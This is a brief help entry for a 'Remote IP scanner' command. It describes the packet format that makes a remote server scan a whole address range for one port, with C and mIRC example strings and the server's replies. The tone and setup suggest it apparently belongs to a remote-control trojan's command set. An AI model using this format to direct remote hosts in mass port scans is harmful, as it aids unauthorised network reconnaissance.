RIS - Remote IP scanner, this one takes some explaining to do:
------------
The remote scanner will scan any given subnet for a specific port.
Ok, the remote IP scanner code is sent in one packet, with the parameters seperated by linefeeds(\n in C)
The first 3 parameters are the 1st set of octets of the starting IP range: RIS24<linefeed>0<linefeed>0<linefeed>
As you might have guessed, parameters 4-6 are the 2nd set of octets, sent the same way
Parameter 7 is the port to scan, and parameter 8 is the delay
So to instruct the server to scan 24.0.0.1 through 24.255.255.255 for port 420 with a 1ms delay, use this string in C: "RIS24\n0\n0\n24\n255\n255\n420\n1"
Or, if your one of those mIRC kiddies that knows nothing about C, you can use RIS24 $+ $cr $+ $cr $+ 0 $+ $cr $+ 0 $+ $cr $+ 24 $+ $cr $+ 255 $+ $cr $+ 255 $+ $cr $+ 420 $+ $cr $+ 1
At the beginning of the scan, the server will say "ATSMscanning started...ETSM", then "scanning started.ATSMscanning X.X.X.*ETSM"
Then, while scanning, it'll say "ATSMfound: X.X.X.<#>ETSM" if the port is open on that IP address.
Once the scan is done, it will say "ATSMscanning finished.ETSM"
